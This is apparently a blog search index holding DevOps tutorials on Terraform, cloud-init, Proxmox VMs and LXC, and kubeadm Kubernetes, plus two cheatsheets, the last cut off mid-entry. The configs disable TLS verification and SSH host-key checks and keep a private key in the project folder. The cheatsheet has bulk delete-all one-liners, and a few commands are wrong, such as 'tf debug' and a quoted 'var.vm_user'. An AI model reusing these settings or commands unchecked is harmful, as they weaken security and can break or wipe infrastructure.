[
  
  {
    "title": "Terraform + Cloud-Init VM Deploy ☁️",
    "url": "/posts/terraform-vm/",
    "categories": "Linux",
    "tags": "Automation, Terraform, LXC, DevOps",
    "date": "2025-04-05 00:00:00 +0530",
    





    
    "snippet": "Provisioning virtual machines manually every time can get repetitive and error-prone. By using Terraform to automate VM creation and Cloud-Init to configure the VM on boot, we can streamline the pr...",
    "content": "Provisioning virtual machines manually every time can get repetitive and error-prone. By using Terraform to automate VM creation and Cloud-Init to configure the VM on boot, we can streamline the process for consistent infrastructure deployments.In this blog post, we’ll walk through a simple but powerful setup for provisioning a virtual machine with Terraform while injecting a custom Cloud-Init configuration to handle OS-level setup.🧰 PrerequisitesMake sure you have the following before starting:  ✅ Terraform installed on your machine  ✅ Access to a Proxmox server or similar virtualization platform  ✅ A base Cloud-Init enabled template image  ✅ SSH key pair generated  ✅ Basic understanding of Terraform📁 Directory StructureI’ve added the complete Terraform code to my GitHub repository. You can easily clone it and start spinning up your Proxmox VMs or LXCs using Cloud-Init templates.git clone https://github.com/s3csys/terraform.git📁 terraform├── 📄 LICENSE├── 📄 README.md├── 📁 proxmox_debian_example├── 📁 proxmox_minikube_cloudinit_example├── 📁 proxmox_multi-lxc_example└── 📁 proxmox_vm_cloudinit_example    ├── 📄 cloudinit.tf    ├── 📁 files    │   ├── 📄 cloudinit.yml    │   └── 🔑 id_rsa    ├── 📄 main.tf    ├── 📄 provider.tf    ├── 📄 terraform.tfvars    └── 📄 vars.tf📦 Step 1: Cloud  VM TemplateBefore Terraform can deploy VMs using Cloud-Init, you need a base template ready. Here’s how to create one using an Ubuntu Cloud image:# 📥 Download the latest Ubuntu cloud imagewget https://cloud-images.ubuntu.com/noble/current/noble-server-cloudimg-amd64.img# 🛠️ Install libguestfs-tools for customizing the imageapt update -y &amp;&amp; apt install libguestfs-tools -y# 📦 Install qemu-guest-agent into the imagevirt-customize -a noble-server-cloudimg-amd64.img --install qemu-guest-agent# 🖥️ Create a new Proxmox VMqm create 5000 --memory 2048 --net0 virtio,bridge=vmbr0 --scsihw virtio-scsi-pci# 💾 Import the disk to local-lvm (must use full path)qm set 5000 --scsi0 local-lvm:0,import-from=/root/noble-server-cloudimg-amd64.img# ⚙️ Configure Cloud-Init drive and serial consoleqm set 5000 --ide2 local-lvm:cloudinitqm set 5000 --serial0 socket --vga serial0# 🧑‍💻 Ensure proper boot settingsqm set 5000 --boot c --bootdisk scsi0# 🧰 Convert the VM into a reusable templateqm template 5000Your Proxmox template is now ready to be cloned with Terraform❯ virt-customize -a noble-server-cloudimg-amd64.img --install qemu-guest-agent[   0.0] Examining the guest ...[  40.7] Setting a random seedvirt-customize: warning: random seed could not be set for this type ofguest[  40.8] Setting the machine ID in /etc/machine-id[  40.8] Installing packages: qemu-guest-agent[ 126.9] Finishing off❯ qm create 5000 --memory 2048 --net0 virtio,bridge=vmbr0 --scsihw virtio-scsi-pci❯ qm set 5000 --scsi0 local-lvm:0,import-from=/tmp/template/noble-server-cloudimg-amd64.imgupdate VM 5000: -scsi0 local-lvm:0,import-from=/tmp/template/noble-server-cloudimg-amd64.img  Logical volume \"vm-5000-disk-0\" created.transferred 0.0 B of 3.5 GiB (0.00%)transferred 35.8 MiB of 3.5 GiB (1.00%)transferred 71.7 MiB of 3.5 GiB (2.00%)transferred 3.5 GiB of 3.5 GiB (100.00%)scsi0: successfully created disk 'local-lvm:vm-5000-disk-0,size=3584M'❯ qm set 5000 --serial0 socket --vga serial0update VM 5000: -serial0 socket -vga serial0❯ qm set 5000 --boot c --bootdisk scsi0update VM 5000: -boot c -bootdisk scsi0❯ qm template 5000  Renamed \"vm-5000-disk-0\" to \"base-5000-disk-0\" in volume group \"pve\"  Logical volume pve/base-5000-disk-0 changed.  WARNING: Combining activation change with other commands is not advised.✍️ Step 2: Cloud-Init ConfigurationCreate a cloudinit.yml file which will handle initial setup inside the VM:#cloud-confighostname: terraform-vmfqdn: terraform-vm.localusers:  - name: ${vm_user}    sudo: ['ALL=(ALL) NOPASSWD:ALL']    groups: sudo, docker    shell: /bin/bash    ssh-authorized-keys:      - ${ssh_key}    disable_root: false    ssh_pwauth: falsepackage_update: truepackage_upgrade: truepackages:  - curl  - htopruncmd:  - echo \"Welcome to Terraform provisioned VM!\" | sudo tee /etc/motd  💡 Tip: You can add more packages or commands to this file as needed for your environment.🚀 Step 3: Terraform Provider (provider.tf)To get started with automating VM deployments on Proxmox using Terraform, you need to configure the Proxmox provider with authentication variables and logging for debugging purposes. Below is the complete providers.tf setup using the Telmate/Proxmox provider.terraform {  required_providers {    proxmox = {      source  = \"Telmate/proxmox\"      version = \"3.0.1-rc6\"    }  }}provider \"proxmox\" {  pm_user              = var.proxmox_PM_USER  pm_api_url           = var.proxmox_pm_api_url  pm_api_token_id      = var.proxmox_PM_API_TOKEN_ID  pm_api_token_secret  = var.proxmox_PM_API_TOKEN_SECRET  pm_tls_insecure      = true  pm_debug             = true  pm_log_enable        = true  pm_log_file          = \"terraform-plugin-proxmox.log\"  pm_log_levels = {    _default    = \"debug\"    _capturelog = \"\"  }}  💡 Make sure to define all referenced variables in your variables.tf or provide them through a terraform.tfvars file or environment variables.⚙️ Step 4: Terraform Config (main.tf)In Terraform main.tf is typically the primary configuration file where you define the main infrastructure resources you want to provision. The .tf stands for Terraform file, and while Terraform doesn’t require any specific filename (as long as it ends in .tf), main.tf is a common convention used to keep things organized. main.tf provisions a Proxmox VM using Terraform by cloning from a template, enabling cloud-init for automationresource \"proxmox_vm_qemu\" \"cloudinit-test\" {    desc        = \"testing the terraform and cloudinit\"    name        = var.vm_name    target_node = var.pm_node    clone       = var.template_name     # The template name to clone this vm from    full_clone  = true    agent       = 1         # Activate QEMU agent for this VM    os_type     = \"cloud-init\"    cores       = 2    sockets     = 1    vcpus       = 0    cpu_type    = \"host\"    memory      = 2048    scsihw      = \"virtio-scsi-pci\"    # Setup the disk    disks {        ide {            ide2 {                cloudinit {                    storage = var.storage_pool                }            }        }        scsi {            scsi0 {                disk {                    size            = 10                    cache           = \"writeback\"                    storage         = var.storage_pool                    #storage_type    = \"rbd\"                    #iothread        = true                    #discard         = true                    replicate       = true                }            }        }    }    network {        id = 0        model = \"virtio\"        bridge = var.network_bridge    }    # Setup the ip address using cloud-init.    boot = \"order=scsi0\"    ipconfig0 = \"ip=20.20.20.150/24,gw=20.20.20.1\"    #ipconfig0 = \"ip=dhcp\"    serial {      id   = 0      type = \"socket\"    }        ciuser = \"var.vm_user\"    cipassword = var.vm_password    cicustom = \"user=local:snippets/cloudinit-${var.vm_name}.yml\"}  Note: Proxmox must already have your Cloud-Init user data file uploaded as a snippet.📦 Step 5: Upload Cloud-Init snippetThis cloud-init.tf script automates the process of rendering a dynamic cloud-init YAML file and securely uploading it to a Proxmox server.# 📄 cloud-init.tf - Generate and Upload Cloud-Init Config using Terraform# 🧠 Reads the cloud-init user-data file with dynamic variablesdata \"template_file\" \"cloudinit_userdata\" {  template = file(\"${path.module}/files/cloudinit.yml\")  vars = {    hostname = var.vm_name    vm_user  = var.vm_user     ssh_key  = var.vm_ssh_key  }}# 📝 Writes the rendered user-data to a local fileresource \"local_file\" \"rendered_cloudinit\" {  content  = data.template_file.cloudinit_userdata.rendered  filename = \"${path.module}/rendered_cloudinit.yml\"}# 🚀 Uploads the file using scp after renderingresource \"null_resource\" \"scp_cloudinit\" {  depends_on = [local_file.rendered_cloudinit]  provisioner \"local-exec\" {    command = &lt;&lt;EOT      scp -i ${path.module}/files/id_rsa \\          -o StrictHostKeyChecking=no \\          ${local_file.rendered_cloudinit.filename} \\          root@${var.proxmox_host}:/var/lib/vz/snippets/cloudinit-${var.vm_name}.yml    EOT  }}🧮 Step 6: Variables and Values (variables.tf and terraform.tfvars)The providers file in Terraform is crucial for defining which external systems or platforms Terraform should interact with. In this case, the configuration specifies the Proxmox provider, which enables Terraform to communicate with a Proxmox VE environment for automating virtual machine provisioning.At the top, the terraform block declares the required provider and its version (Telmate/proxmox at version 3.0.1-rc6). This ensures that the appropriate plugin is downloaded and used during Terraform operations.# 🔐 Proxmox Authenticationvariable \"proxmox_pm_api_url\"       { type = string }variable \"proxmox_PM_USER\"          { type = string }variable \"proxmox_PM_API_TOKEN_ID\"  { type = string, sensitive = true }variable \"proxmox_PM_API_TOKEN_SECRET\" { type = string, sensitive = true }# 💻 VM Configurationvariable \"vm_name\"     { type = string }variable \"vm_user\"     { type = string }variable \"vm_password\" { type = string, sensitive = true }variable \"vm_ssh_key\"  { type = string }# 🖥️ Proxmox VM Infrastructurevariable \"pm_node\"        { type = string }variable \"template_name\"  { type = string }variable \"storage_pool\"   { type = string }variable \"network_bridge\" { type = string }variable \"proxmox_host\"   { type = string }# 🔐 Proxmox Authenticationproxmox_pm_api_url         = \"https://&lt;PROXMOX_IP&gt;:8006/api2/json\"proxmox_PM_USER            = \"terraform@pve\"proxmox_PM_API_TOKEN_ID    = \"terraform@pve!terraform\"proxmox_PM_API_TOKEN_SECRET = \"ffb26b21-abcd-defg-hijkl-01feffc7e6e4\"# 💻 VM Configurationvm_name      = \"cloudinit\"vm_user      = \"your_vm_user\"vm_password  = \"your_secure_password\"vm_ssh_key   = \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIaaaaaaaaaaaaaaa/qqa9Mtkzn6G3oaM03AFKinPjO @public_key\"# 🖥️ Proxmox VM Infrastructurepm_node        = \"pve\"template_name  = \"&lt;VM_TEMPLATE_ID&gt;\"  # e.g., \"9000\" or any existing template VM IDstorage_pool   = \"local-lvm\"network_bridge = \"vmbr0\"proxmox_host   = \"&lt;PROXMOX_SSH_IP&gt;\"  # Used for SCP upload (e.g., \"192.168.1.10\")🚀 Step 7: Initialize &amp; ApplyOnce your Terraform configuration files and variables are set up, it’s time to deploy the infrastructure. This step involves running a series of Terraform commands to initialize the environment, review the execution plan, and apply the configuration to provision the virtual machine.  Initialize the Working Directory    terraform init        Review the Execution Plan    terraform plan --out=\"tfplan\"        Apply the Configuration    terraform apply \"tfplan\"      Using Terraform + Cloud-Init + a custom Proxmox VM template, you can automate and scale your infrastructure with ease. This approach is perfect for repeatable, secure, and hands-off provisioning for test labs, production, or homelab environments.Feel free to extend this setup by turning it into a module or integrating with CI/CD pipelines. For a quick reference on Terraform commands, check out the Terraform Cheatsheet"
  },
  
  {
    "title": "Kubernetes Cluster Setup",
    "url": "/posts/kubernetes/",
    "categories": "Linux",
    "tags": "Automation, Docker, Linux, DevOps",
    "date": "2025-04-04 00:00:00 +0530",
    





    
    "snippet": "Kubernetes has become the go-to container orchestration platform for managing scalable, containerized applications. Whether you’re running a homelab, setting up a microservices app, or learning Dev...",
    "content": "Kubernetes has become the go-to container orchestration platform for managing scalable, containerized applications. Whether you’re running a homelab, setting up a microservices app, or learning DevOps, Kubernetes is worth mastering.This document provides a step-by-step guide to setting up a Kubernetes cluster using kubeadm on multiple nodes. Kubernetes is an open-source container orchestration platform that automates the deployment, scaling, and management of containerized applicationsKubernetes NodesIn a Kubernetes cluster, you will encounter two distinct categories of nodes:Master Nodes: These nodes play a crucial role in managing the control API calls for various components within the Kubernetes cluster. This includes overseeing pods, replication controllers, services, nodes, and more.Worker Nodes: Worker nodes are responsible for providing runtime environments for containers. It’s worth noting that a group of container pods can extend across multiple worker nodes, ensuring optimal resource allocation and management.🛠️ Prerequisites:Before diving into the installation, ensure that your environment meets the following prerequisites:  A fresh ubuntu (24.04) machine (1 master and 2 slave)  Minimum 2 CPU cores and 2GB RAM  Root or sudo access  Swap disabled (swapoff -a)  Internet access📦 Step 1: Prepare the SystemFirst, update your system and install some essential packages:sudo apt update &amp;&amp; sudo apt upgrade -ysudo apt install -y curl apt-transport-https ca-certificates gnupg lsb-release curlDisable swap (Kubernetes doesn’t support it):sudo swapoff -asudo sed -i '/ swap / s/^/#/' /etc/fstab🌐 Step 2: Install Container Runtime (containerd)As of Kubernetes v1.24+, Docker is no longer directly supported. Instead, we’ll use containerd, which is a lightweight container runtime.Install containerd on all nodes:sudo apt install -y containerdsudo mkdir -p /etc/containerdcontainerd config default | sudo tee /etc/containerd/config.tomlsudo systemctl restart containerdsudo systemctl enable containerd🔧 Step 3: Install kubeadm, kubelet, and kubectlAdd the Kubernetes apt repository:# If the folder `/etc/apt/keyrings` does not exist, it should be created before the curl command, read the note below.# sudo mkdir -p -m 755 /etc/apt/keyringscurl -fsSL https://pkgs.k8s.io/core:/stable:/v1.32/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpgsudo chmod 644 /etc/apt/keyrings/kubernetes-apt-keyring.gpg # allow unprivileged APT programs to read this keyring  In releases older than Debian 12 and Ubuntu 22.04, folder /etc/apt/keyrings does not exist by default, and it should be created before the curl command.# This overwrites any existing configuration in /etc/apt/sources.list.d/kubernetes.listecho 'deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.32/deb/ /' | sudo tee /etc/apt/sources.list.d/kubernetes.listsudo chmod 644 /etc/apt/sources.list.d/kubernetes.list   # helps tools such as command-not-found to work correctlyInstall Kubernetes components:sudo apt updatesudo apt install -y kubelet kubeadm kubectlsudo apt-mark hold kubelet kubeadm kubectl⚖️ Step 4: Initialize the Master NodeNow, on the master node only, initialize the cluster:sudo kubeadm init --pod-network-cidr=192.168.0.0/16After a successful init, follow the output instructions to set up your kubectl config:mkdir -p $HOME/.kubesudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/configsudo chown $(id -u):$(id -g) $HOME/.kube/config🤝 Step 5: Join Worker Nodes to the ClusterRun the kubeadm join … command shown earlier on each worker node. It will look something like this:sudo kubeadm join &lt;master-ip&gt;:6443 --token &lt;token&gt; --discovery-token-ca-cert-hash sha256:&lt;hash&gt;This connects the worker nodes to your master and makes them part of the cluster.To verify, return to the master node and run:kubectl get nodesYou should see all 3 nodes (1 master + 2 workers) listed.🛡️ Step 6: Install a Pod Network (Calico)Still on the master, install Calico networking so your pods can communicate across nodes:kubectl apply -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.1/manifests/calico.yamlVerify everything is running:kubectl get nodeskubectl get pods -A🚧 Optional: Allow Workloads on Master (Homelab Only)If you’re in a non-production or homelab environment and want the master to also run pods:kubectl taint nodes --all node-role.kubernetes.io/control-plane-  Production clusters should leave master nodes tainted to dedicate them for control plane operations only.🧪 Testing the SetupLet’s deploy a test nginx pod to verify that scheduling and networking are working fine:kubectl create deployment nginx --image=nginxkubectl expose deployment nginx --port=80 --type=NodePortkubectl get svcVisit your node IP with the NodePort to see if nginx is running.ConclusionBy setting up a Kubernetes cluster with one master and two worker nodes using kubeadm, you’ve laid the foundation for mastering container orchestration. This setup empowers you to test deployments, experiment with microservices, and grow your DevOps skills in a real-world environment.Keep exploring Kubernetes features like Ingress controllers, persistent volumes, Helm charts, and observability tools. And if you’re ever lost in the sea of commands, bookmark this handy Kubernetes Cheat Sheet to keep your workflow smooth and efficient."
  },
  
  {
    "title": "Terrafrom",
    "url": "/posts/tfcheat/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-03-29 00:00:00 +0530",
    





    
    "snippet": "🌱 Terraform CheatsheetTerraform is an Infrastructure as Code (IaC) tool that allows you to define and provision infrastructure using declarative configuration files. This cheatsheet covers essentia...",
    "content": "🌱 Terraform CheatsheetTerraform is an Infrastructure as Code (IaC) tool that allows you to define and provision infrastructure using declarative configuration files. This cheatsheet covers essential Terraform commands, configurations, and best practices.🔄 InstallationLinux / MacOSInstall Terraform using a package manager:brew install terraform  # MacOSsudo apt install terraform  # Ubuntu/DebianWindowsInstall Terraform using Chocolatey:choco install terraformVerify InstallationCheck the installed Terraform version:terraform version📚 Basic CommandsInitialize Terraform in the directory:terraform initShow execution plan without applying changes:terraform planApply changes to infrastructure:terraform applyDestroy all managed infrastructure:terraform destroyFormat Terraform files to standard:terraform fmtValidate configuration syntax:terraform validateShow outputs defined in configuration:terraform outputList used providers:terraform providers📂 Project StructureA typical Terraform project is structured as follows:project-folder/├── main.tf       # Main configuration file├── variables.tf  # Input variables├── outputs.tf    # Output values├── provider.tf   # Provider configuration├── terraform.tfstate  # State file (after apply)├── terraform.tfvars   # Variable definitions📖 Writing a Basic ConfigurationDefine an AWS provider and an EC2 instance:provider \"aws\" {  region = \"us-west-2\"}resource \"aws_instance\" \"example\" {  ami           = \"ami-123456\"  instance_type = \"t2.micro\"}📊 Variables &amp; OutputsDefining Variables (variables.tf)Define an instance type variable:variable \"instance_type\" {  type    = string  default = \"t2.micro\"}Using VariablesReference the variable inside a resource:resource \"aws_instance\" \"example\" {  instance_type = var.instance_type}Outputs (outputs.tf)Retrieve instance public IP:output \"instance_ip\" {  value = aws_instance.example.public_ip}📜 State ManagementList all resources in state:terraform state listShow details of the current state:terraform showSync state file with real-world resources:terraform refreshMove resources in state:terraform state mvRemove resources from state without deleting them:terraform state rm🏠 Remote State StorageStoring Terraform state remotely helps in team collaboration.terraform {  backend \"s3\" {    bucket         = \"my-terraform-bucket\"    key            = \"state/terraform.tfstate\"    region         = \"us-west-2\"    encrypt        = true  }}🔧 ModulesModules allow you to reuse Terraform configurations.Creating a Module (modules/vm/main.tf)variable \"instance_type\" {}resource \"aws_instance\" \"vm\" {  instance_type = var.instance_type}Using a Modulemodule \"web\" {  source         = \"./modules/vm\"  instance_type  = \"t3.small\"}🔒 Secrets &amp; Sensitive DataAvoid hardcoding secrets in .tf files. Use environment variables:export TF_VAR_password=\"my-secret-password\"Or use a secrets manager like AWS Secrets Manager, HashiCorp Vault, or SSM Parameter Store.🔄 Terraform Lifecycle HooksControl resource updates with lifecycle rules:resource \"aws_instance\" \"example\" {  lifecycle {    create_before_destroy = true    ignore_changes = [ tags ]  }}🔍 Debugging &amp; TroubleshootingEnable debugging:tf debugSave execution plan for debugging:terraform plan -out=tfplanSet the log level:export TF_LOG=DEBUG💡 Best Practices  Use remote state storage for collaboration.  Keep Terraform configurations modular.  Use .ignore to exclude unnecessary files.  Never commit terraform.tfstate to version control.This cheatsheet provides a quick reference for working with Terraform effectively. Happy coding! 🚀"
  },
  
  {
    "title": "Terraform Proxmox LXC Containers",
    "url": "/posts/terraform/",
    "categories": "Linux",
    "tags": "Automation, Terraform, LXC, DevOps",
    "date": "2025-03-29 00:00:00 +0530",
    





    
    "snippet": "Infrastructure as Code (IaC) has revolutionized the way we manage and deploy infrastructure. Terraform, one of the most popular IaC tools, enables automation and efficient provisioning of resources...",
    "content": "Infrastructure as Code (IaC) has revolutionized the way we manage and deploy infrastructure. Terraform, one of the most popular IaC tools, enables automation and efficient provisioning of resources. In this guide, we’ll walk through provisioning LXC containers using Terraform on a Debian server.🏗️ PrerequisitesCreating the user/role for terraformLog into the Proxmox cluster or host using ssh (or mimic these in the GUI) then:  Create a new role TerraformProv for the future terraform user.  Create the user “terraform@pve”  Add the TerraformProv role to the terraform user  Create the api tocken for the terraform userpveum role add TerraformProv -privs \"Datastore.AllocateSpace Datastore.AllocateTemplate Datastore.Audit Pool.Allocate Sys.Audit Sys.Console Sys.Modify VM.Allocate VM.Audit VM.Clone VM.Config.CDROM VM.Config.Cloudinit VM.Config.CPU VM.Config.Disk VM.Config.HWType VM.Config.Memory VM.Config.Network VM.Config.Options VM.Migrate VM.Monitor VM.PowerMgmt SDN.Use \"pveum user add terraform@pve --password &lt;password&gt;pveum aclmod / -user terraform@pve -role TerraformProvto modify the permissionspveum role modify TerraformProv -privs \"Datastore.AllocateSpace Datastore.AllocateTemplate Datastore.Audit Pool.Allocate Sys.Audit Sys.Console Sys.Modify VM.Allocate VM.Audit VM.Clone VM.Config.CDROM VM.Config.Cloudinit VM.Config.CPU VM.Config.Disk VM.Config.HWType VM.Config.Memory VM.Config.Network VM.Config.Options VM.Migrate VM.Monitor VM.PowerMgmt SDN.Use User.Modify\"API TokenFrom the proxmox GUI, create an API Token for the terraform user.  note: ensure privilege separation for your API Token is disabled or terraform will error out later on:📌 Installing Terraform on LinuxTerraform is primarily distributed as a .zip package containing a single executable, which can be extracted and placed anywhere on your Linux system.For seamless integration with configuration management tools, Terraform also provides official package repositories for Debian-based and RHEL-based distributions. This enables installation using standard package managers like APT, Yum, or DNF, simplifying updates and dependency management.Install Terraform in Debian, Ubuntu &amp; Mintwget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpgecho \"deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main\" | sudo tee /etc/apt/sources.list.d/hashicorp.listsudo apt update sudo apt install terraformInstall Terraform in RHEL and CentOSsudo yum install -y yum-utilssudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.reposudo yum updatesudo yum -y install terraformInstall Terraform in Fedorasudo dnf install -y dnf-plugins-coresudo dnf config-manager --add-repo https://rpm.releases.hashicorp.com/fedora/hashicorp.reposudo dnf updatesudo dnf -y install terraformNow the installation can be verified by running a simple terraform version command.terraform version🛠️ Terraform ConfigurationTerraform requires a provider and resource definitions. Below is a basic example of how to define LXC containers using Terraform.📄 Terraform Configuration File (main.tf)resource \"proxmox_lxc\" \"basic\" {  target_node  = \"pve\"  hostname     = \"lxc-basic\"  ostemplate   = \"local:vztmpl/ubuntu-20.04-standard_20.04-1_amd64.tar.gz\"  password     = \"BasicLXCContainer\"  unprivileged = true  // Terraform will crash without rootfs defined  rootfs {    storage = \"local-zfs\"    size    = \"8G\"  }  network {    name   = \"eth0\"    bridge = \"vmbr0\"    ip     = \"dhcp\"  }}📌 Initializing TerraformRun the following commands to initialize and apply the Terraform configuration:terraform initterraform apply -auto-approveThis will create the LXC container as defined in the main.tf file.🎯 Managing LXC Containers with TerraformTerraform allows easy management of LXC containers. Here are a few useful commands:  Check Infrastructure State:    terraform show        Update Configuration: Modify main.tf and apply changes:    terraform apply        Destroy Containers:    terraform destroy -auto-approve      Deploying the proxmox container securlyCreate a provider.tf file and install the below provider by running terraform initterraform {  required_providers {    proxmox = {      source  = \"Telmate/proxmox\"      version = \"3.0.1-rc6\"    }  }}provider \"proxmox\" {  pm_user              = var.proxmox_PM_USER  pm_api_url           = var.proxmox_pm_api_url  pm_api_token_id      = var.proxmox_PM_API_TOKEN_ID  pm_api_token_secret  = var.proxmox_PM_API_TOKEN_SECRET  pm_tls_insecure      = true  pm_debug             = true  pm_log_enable        = true  pm_log_file          = \"terraform-plugin-proxmox.log\"  pm_log_levels = {    _default    = \"debug\"    _capturelog = \"\"  }}Create a vars.tf file and include your variables in it.variable \"proxmox_PM_USER\" {  type = string}variable \"proxmox_pm_api_url\" {  type = string}variable \"proxmox_PM_API_TOKEN_ID\" {  type = string  sensitive = true}variable \"proxmox_PM_API_TOKEN_SECRET\" {  type = string  sensitive = true}Create a terraform.tfvars file and store your credentials in it. Remember to use gitignore if you are going to commit this to your public or private GitHub repo.proxmox_PM_USER = \"user@pve\"proxmox_pm_api_url = \"https://$IP$:8006/api2/json\"proxmox_PM_API_TOKEN_ID = \"user@pve!terraform\"proxmox_PM_API_TOKEN_SECRET = \"abcedfg-b911-abcd-1234-791ebb4337f3\"Create a main.tf file, that is where I will a write a configuration rule that would provision two nodes in my proxmox home labresource \"proxmox_lxc\" \"debain_lxc\" {  target_node  = \"hulk\"  hostname     = \"debian\"  ostemplate   = \"nasp:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst\"  unprivileged = true  ssh_public_keys = &lt;&lt;-EOT    ssh-rsa &lt;public_key_1&gt; user@example.com    ssh-ed25519 &lt;public_key_2&gt; user@example.com  EOT  // Terraform will crash without rootfs defined  rootfs {    storage = \"local-lvm\"    size    = \"10G\"  }  network {    name   = \"eth0\"    bridge = \"vmbr0\"    ip     = \"XX.XX.XX.XXX\"    ip6    = \"auto\"  }}Then runterraform planterraform applyTo clean the deploymentsterraform destroy✅ Troubleshooting Steps1️⃣ Ensure You Are Using the Correct -var-file ArgumentTerraform does not automatically load custom *.tfvars files (except terraform.tfvars and *.auto.tfvars). You must specify it manually:terraform plan -var-file=\"credentials.tfvars\"2️⃣ Validate Terraform’s Variable RecognitionRun the following command to confirm Terraform recognizes the variable:terraform console&gt; var.proxmox_prod_secret_token  If Terraform does not recognize it, the issue is with variable declaration or tfvars loading.  If Terraform recognizes it, but terraform plan fails, check if the variable is being used correctly.3️⃣ Recommended Ways to Load credentials.tfvars Automatically  Use terraform.tfvars or *.auto.tfvars (Best Practice)1️⃣ Terraform automatically loads:          terraform.tfvars      *.auto.tfvars (e.g., credentials.auto.tfvars)      2️⃣ Use an Environment VariableSet the variables in your shell instead of credentials.tfvars:export TF_VAR_proxmox_prod_secret_token=\"your-secret-token\"terraform planThis method avoids storing secrets in files.🔥 ConclusionBy integrating Terraform with LXC, you can automate container provisioning efficiently. This approach enhances reproducibility, scalability, and version control for your infrastructure. Explore more Terraform configurations and enhance your containerized environment!For a quick reference on Terraform commands, check out the Terraform Cheatsheet"
  },
  
  {
    "title": "Kubernetes",
    "url": "/posts/kcheat/",
    "categories": "Cheatsheet",
    "tags": "cheatsheet",
    "date": "2025-03-29 00:00:00 +0530",
    





    
    "snippet": "☸️ Kubernetes Cheat Sheet📦 Cluster &amp; Node Management  Get cluster info.    kubectl cluster-info        List all nodes.    kubectl get nodes        Get node details.    kubectl describe node &lt...",
    "content": "☸️ Kubernetes Cheat Sheet📦 Cluster &amp; Node Management  Get cluster info.    kubectl cluster-info        List all nodes.    kubectl get nodes        Get node details.    kubectl describe node &lt;node-name&gt;        Mark a node as unschedulable.    kubectl cordon &lt;node-name&gt;        Mark a node as schedulable.    kubectl uncordon &lt;node-name&gt;        Evict all pods from a node.    kubectl drain &lt;node-name&gt; --ignore-daemonsets        Taint a node.    kubectl taint nodes &lt;node-name&gt; key=value:NoSchedule        Add a label to a node.    kubectl label nodes &lt;node-name&gt; key=value        Display node labels.    kubectl get nodes --show-labels        Delete a node from the cluster.    kubectl delete node &lt;node-name&gt;        Get nodes with a specific label.    kubectl get nodes --selector=env=prod        Assign a node role.    kubectl label node &lt;node-name&gt; node-role.kubernetes.io/worker=        Forcefully drain a node.    kubectl drain &lt;node-name&gt; --delete-local-data --force --ignore-daemonsets        Custom format output.    kubectl get nodes -o custom-columns=NAME:.metadata.name,STATUS:.status.conditions.type        Display node resource usage efficiently.    kubectl top nodes --use-protocol-buffers        List only node names.    kubectl get nodes -o jsonpath='{.items[*].metadata.name}{\"\\n\"}{end}'        Check node capacity.    kubectl get nodes -o yaml | grep capacity        Get node taints.    kubectl describe node &lt;node-name&gt; | grep Taint        Label a node.    kubectl label node &lt;node-name&gt; disktype=ssd        Get nodes with a specific label.    kubectl get nodes -l disktype=ssd        Drain a node and delete emptyDir volumes.    kubectl drain &lt;node-name&gt; --ignore-daemonsets --delete-emptydir-data        Delete all nodes.    kubectl get nodes --no-headers | awk '{print $1}' | xargs kubectl delete node        Get Kubelet version of nodes.    kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.kubeletVersion}'      🥅 Pod Management  List all pods in the current namespace.    kubectl get pods        List all pods in all namespaces.    kubectl get pods -A        List pods with node details.    kubectl get pods -o wide        Get pod details.    kubectl describe pod &lt;pod-name&gt;        View logs of a pod.    kubectl logs &lt;pod-name&gt;        View logs of a specific container.    kubectl logs &lt;pod-name&gt; -c &lt;container-name&gt;        Access a running pod’s shell.    kubectl exec -it &lt;pod-name&gt; -- /bin/sh        Delete a pod.    kubectl delete pod &lt;pod-name&gt;        Force delete a pod.    kubectl delete pod --force --grace-period=0 &lt;pod-name&gt;        Get pod YAML configuration.    kubectl get pod &lt;pod-name&gt; -o yaml        Get pods by label.    kubectl get pod --selector=env=prod        Add a label to a pod.    kubectl label pod &lt;pod-name&gt; env=prod        Add an annotation.    kubectl annotate pod &lt;pod-name&gt; description=\"Test pod\"        List pods with a specific label.    kubectl get pods -l app=myapp        Delete pods using a label selector.    kubectl delete pods -l app=myapp        View logs from a previous container instance.    kubectl logs --previous &lt;pod-name&gt;        Execute a command in a specific container.    kubectl exec &lt;pod-name&gt; -c &lt;container-name&gt; -- ls /app        Copy a file from a pod.    kubectl cp &lt;pod-name&gt;:&lt;file-path&gt; &lt;destination&gt;        Copy a file to a pod.    kubectl cp &lt;source-file&gt; &lt;pod-name&gt;:&lt;destination-path&gt;        Sort pods by creation time.    kubectl get pods --sort-by=.metadata.creationTimestamp        Force delete a pod immediately.    kubectl delete pod &lt;pod-name&gt; --grace-period=0 --force        Get the IP address of a pod.    kubectl get pod &lt;pod-name&gt; -o jsonpath='{.status.podIP}'        List only pod names.    kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{\"\\n\"}{end}'        Get only running pods.    kubectl get pods --field-selector=status.phase=Running        Get pod conditions.    kubectl get pod &lt;pod-name&gt; -o jsonpath='{.status.conditions}'        Get container images inside a pod.    kubectl get pod &lt;pod-name&gt; -o jsonpath='{.spec.containers[*].image}'        Patch container image.    kubectl patch pod &lt;pod-name&gt; -p '{\"spec\":{\"containers\":[{\"name\":\"&lt;container-name&gt;\",\"image\":\"nginx:latest\"}]}}'        Delete all pods.    kubectl get pods --no-headers | awk '{print $1}' | xargs kubectl delete pod        Delete all failed pods.    kubectl delete pod -n &lt;namespace&gt; --field-selector=status.phase=Failed        Delete failed pods.    kubectl delete pod --field-selector=status.phase=Failed      🚀 Deployment Management  List all deployments.    kubectl get deployments        Get deployment details.    kubectl describe deployment &lt;deployment-name&gt;        Deploy resources from a YAML file.    kubectl apply -f &lt;deployment.yaml&gt;        Create a simple deployment.    kubectl create deployment &lt;name&gt; --image=&lt;image&gt;        Delete a deployment.    kubectl delete deployment &lt;deployment-name&gt;        Check deployment rollout status.    kubectl rollout status 